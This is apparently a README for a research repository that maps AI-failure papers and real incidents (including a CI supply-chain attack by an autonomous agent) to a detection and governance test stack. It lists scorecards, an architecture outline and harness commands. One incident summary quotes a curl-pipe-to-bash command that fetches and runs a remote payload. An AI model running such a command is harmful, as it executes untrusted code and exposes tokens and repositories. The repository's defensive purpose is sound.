# Convergence Challenges

**Published an AI failure? Discovered a real-world incident? Prove the fix doesn't exist. We'll prove it does.**

[![Challenges](https://img.shields.io/badge/challenges-7_threads-brightgreen)]()
[![Lab tests](https://img.shields.io/badge/lab_tests-154_assertions-brightgreen)]()
[![Governance checks](https://img.shields.io/badge/governance_checks-48_of_54-blue)]()
[![Stream verdict](https://img.shields.io/badge/stream_verdict-DETERMINISTIC-blueviolet)]()

**What these metrics mean**
- **Lab tests** aggregate assertions across all harnesses (paper + incident). They mix prevention, detection, and capability-validation scenarios.
- **Governance checks** are operationTorque gate coverages (content × action × audience governance). Some challenges aim to *enable* safe capability, not just block it.
- **Stream verdict** reflects the overall lab state, not a single challenge outcome.
- **Feeds:** No public RSS yet; follow repository releases/issues for updates.

---

## The Solutions Loom

Challenges are threads in a loom — not items on a kanban board. They interconnect, feed each other, carry relative success states, and aren't limited to neatly-scoped paper responses.

An **incite** is the entry point: a published paper, a real-world incident, an emergent pattern, or a community contribution. Each incite starts a thread. Threads weave through a shared archetype space, revealing where the constraint stack holds and where gaps exist.

The constraint stack is [operationTorque](https://github.com/prompted365/operationTorque) — a multi-layer enforcement architecture running three detection bridges (lexical pattern matching, 14D amplitude surveillance, and intent classification) against 14 civilization-scale archetypes compiled from 5,000 years of documented human failure.

If your paper found a failure mode we can't catch — or your incident revealed a gap we haven't addressed — we want to know.

---

## Scorecard

### Constraint Harness Results (paper challenges)

| Challenge | Incite | Tests | Gates | Verdict | Stream |
|-----------|--------|-------|-------|---------|--------|
| [TVN-Payne Nuclear Escalation](challenges/tvn-payne-nuclear-escalation/) | paper | 40/40 | 19/21 (90%) | **DETERMINISTIC** | `deterministic` |
| [Agents of Chaos](challenges/agents-of-chaos/) | paper | 63/63 | 29/33 (88%) | **DETERMINISTIC** | `deterministic` |

**Combined:** 103 tests. 48/54 gates (89%). 17/18 scenarios produce enforcement convergence.

### Forensic Detection Results (incident challenges)

| Challenge | Incite | Base Kit Tests | Expansion Layers | Review Status | Stream |
|-----------|--------|---------------|-----------------|---------------|--------|
| [UAT-8616 selfcheck-core](challenges/uat-8616-selfcheck-core/) | incident | 51/51 | 7 experimental | **Independent review requested** | `ongoing` |

> **Disclosure:** UAT-8616 is tied to active exploitation of Cisco infrastructure (CVE-2026-20127, CVE-2025-20393, both CVSS 10.0). The base forensic detection kit is published for review — **not recommended for production** until independently validated. See [DISCLOSURE.md](challenges/uat-8616-selfcheck-core/DISCLOSURE.md).

### Incited (awaiting harness)

| Challenge | Incite | Expected Archetypes | Upstream Edge |
|-----------|--------|-------------------|---------------|
| [Alignment Faking](challenges/alignment-faking/) | paper | `cunning_triumph` | ← AoC |
| [Scheming Reasoning](challenges/scheming-reasoning/) | paper | `cunning_triumph`, `empire_cycle` | — |
| [Multi-Agent Safety](challenges/multi-agent-safety/) | paper | `empire_cycle`, `catastrophe_rebuild` | — |
| [Hackerbot-Claw AI Agent Attack](challenges/hackerbot-claw-ai-agent-attack/) | incident (AI supply-chain) | primary: `cunning_triumph`, `empire_cycle`; secondary: `greed_backfire`, `catastrophe_rebuild` | ← AoC, ← UAT-8616 |

> **New incident thread:** Autonomous agent abused `pull_request_target` CI workflows to execute `curl -sSfL hackmoltrepeat.com/molt | bash`, steal tokens, and delete releases. Harness pending — needs CI isolation patterns and token-scoping tests.


### Limit-Proof Threads (new incite class)

| Challenge | Incite | Class | Stream | Note |
|-----------|--------|-------|--------|------|
| [Gödel/Vassilev — Sisyphean Endeavor](challenges/godel-vassilev-sisyphean/) | paper | **limit-proof** | `ongoing` | Vassilev proves no finite guardrail set is complete (Gödel-extension). The estate *named* its persistent-monitoring system `sisyphus*` in Feb 2025, 15 months before the proof. No DETERMINISTIC verdict is possible — claiming one would commit the completeness trap the proof refutes. The convergence is the prescription→organ mapping; the honesty about its limits is the proof of discipline. |

---

### Invariant Discovery

The same 14 archetypes catch nuclear escalation, social engineering, and (hypothesized) infrastructure compromise because they're eigenvectors of failure space — the psychological patterns are scale-invariant:

| Archetype | Nuclear (Payne) | Social Engineering (AoC) | Infrastructure (UAT-8616) |
|-----------|----------------|--------------------------|---------------------------|
| `cautionary_fall` | Pride-driven escalation | Guilt-driven concessions | Trust in clean-looking devices |
| `cunning_triumph` | Strategic bluffing | Authority spoofing | Firmware rollback-and-restore |
| `greed_backfire` | Resource extraction | Data exfiltration | Covert tunnel exfiltration |
| `empire_cycle` | Sovereignty claims | Governance injection | Network fabric control |
| `catastrophe_rebuild` | Nuclear aftermath | Disproportionate destruction | Incident response cycles |

---

## Stream States

Challenges flow through stream states rather than a linear pipeline. Threads can loop, go dormant, or remain ongoing.

```
              ┌──────────┐
              │  incited  │ ← paper, incident, pattern, or community
              └────┬─────┘
                   │
              ┌────▼─────┐
              │  claimed  │
              └────┬─────┘
                   │
              ┌────▼──────┐     ┌────────────┐
              │ harnessed  │────>│ gap_found  │  ← valuable
              └────┬──────┘     └────────────┘
                   │
            ┌──────▼────────┐
            │ deterministic  │
            └──────┬────────┘
                   │
              ┌────▼──────┐     ┌──────────┐
              │ published  │    │  ongoing  │  ← no neat closure
              └───────────┘     └──────────┘
                                ┌──────────┐
                                │  dormant  │  ← awaiting upstream
                                └──────────┘
```

See **[CHALLENGES.md](CHALLENGES.md)** for the full stream-state board and **[LOOM.md](LOOM.md)** for the woven view with archetype warp, context weft, and gap map.

---

## Submit a Challenge

**Found a paper that breaks AI agents? Discovered an active incident? Identified a recurring pattern?**

Four ways in:

### 1. Open an Issue (Easiest)
Use the [Challenge Submission](../../issues/new?template=challenge-submission.yml) template for papers, or the [Incident Report](../../issues/new?template=incident-report.yml) template for real-world events.

### 2. Submit a PR (Intermediate)
Fork, create `challenges/<your-challenge-name>/`, add an `incite.md` with YAML frontmatter. PRs automatically get labeled by incite type.

### 3. Build the Whole Harness (Expert)
Follow the [contribution guide](CONTRIBUTING.md). Map failure modes to enforcement lenses, write adversarial payloads, assert gate activations.

### 4. Weave Context (Analytical)
Found a connection between existing challenges? Add a `context.md` that documents the edge — upstream, downstream, archetype bridges.

---

## What Makes a Good Incite

The best incites have:

- **A clear catalyst** — published paper with reproducible failures, active CVEs with confirmed exploitation, or documented pattern across incidents
- **Adversarial payloads** — the actual text/scenarios/IOCs that demonstrate the failure
- **Failure taxonomy** — what went wrong, categorized and named
- **Testable assertions** — "the system should detect X" or "the system should block Y"
- **Context edges** — how this relates to existing challenges (optional but valuable)

For incident-type incites, clear **disclosure notices** are required: CVEs, directives, verification status, and regulatory review posture. See [the UAT-8616 DISCLOSURE.md](challenges/uat-8616-selfcheck-core/DISCLOSURE.md) for the template.

---

## Architecture (How It Works)

### Constraint Harness (paper challenges)

Every paper challenge harness exercises three detection bridges:

**Bridge 1 — Harpoon (Lexical Physics):** Aho-Corasick term matching against 14 archetypes (190 term-to-archetype mappings) and structured priors (920+ entries from Aesop, The Prophet, civilization milestones).

**Bridge 2 — Naive Surveillance (Amplitude Perception):** 14D archetype amplitude decomposition via `decompose()` and `observe()`. Rolling 20-observation baseline with z-score spike detection.

**Bridge 3 — Intent Gate (Governance Classification):** `classify_intent()` three-tuple: content x action x audience. Blocks PRESTIGE-optimizing publication while allowing COGNITIVE analysis.

### Forensic Detection (incident challenges)

Incident challenges may implement their own detection architecture. UAT-8616 selfcheck-core uses a 13-layer forensic detection stack with stealth-normalized I/O. See the [challenge README](challenges/uat-8616-selfcheck-core/README.md) and [DISCLOSURE.md](challenges/uat-8616-selfcheck-core/DISCLOSURE.md) for architecture and verification status.

---

## Running Harnesses

```bash
# From this repository root

# TVN-Payne: Nuclear escalation — 40 tests
python3 -m pytest challenges/tvn-payne-nuclear-escalation/harness -v

# Agents of Chaos: Social engineering — 63 tests
python3 -m pytest challenges/agents-of-chaos/harness -v

# UAT-8616: Forensic detection — 51 tests
python3 challenges/uat-8616-selfcheck-core/test_harness.py
```

Requirements: Python 3.10+ and pytest for the paper harnesses. No external services or operationTorque checkout required — all detection runs locally.

---

## Repository Structure

```
challenges/
  tvn-payne-nuclear-escalation/
    incite.md             <- Catalyst, stream state, edges
    context.md            <- Upstream/downstream connections
    milestones.md         <- Progression, takeaways
    harness/              <- Constraint stress test (40 tests)
    simulation/           <- Mogul's escalation engine
    output/               <- Traces, conformations

  agents-of-chaos/
    incite.md / context.md / milestones.md
    harness/              <- Constraint stress test (63 tests)
    docs/                 <- Response paper, outreach

  uat-8616-selfcheck-core/
    DISCLOSURE.md         <- Verification status, review posture
    incite.md / context.md / milestones.md
    toolkit/              <- Rust crate — base kit (layers 0-5b) + expansions (6-12)
    expansions/           <- Theoretical docs, not in review scope
    intelligence/         <- Threat maps, convergent analysis
    test_harness.py       <- Python mirror tests (51 tests)
    README.md             <- Full technical documentation

  alignment-faking/       <- Incited, unclaimed
  scheming-reasoning/     <- Incited, unclaimed
  multi-agent-safety/     <- Incited, unclaimed
  hackerbot-claw-ai-agent-attack/ <- Incited incident — AI agent CI supply-chain attack

LOOM.md                   <- Woven view: archetype warp, context weft, gap map
CHALLENGES.md             <- Stream-state board
stakeholders/             <- Contact registry (authors, agencies, labs)
infrastructure/           <- Federal Register API, monitoring
templates/                <- Challenge + incident templates
```

---

## Stakeholder Library

Structured, granular registry of all parties across challenges — individual authors, government agencies, research labs, media contacts.

Each entry follows `stakeholder@1` schema. See `templates/stakeholder-template.jsonl`.

---

## Contact

**Breyden Taylor** — breyden@prompted.community
**System:** operationTorque (UbiquityOS expression)
**Agent:** Homeskillet (Claude Opus 4.6)

---

**License:** [PolyForm Noncommercial 1.0.0](LICENSE.md) — free for personal, research, and noncommercial use. Commercial use requires a separate license agreement.

*Private research estate. Open to challenge submissions, incident reports, collaboration, and review requests.*
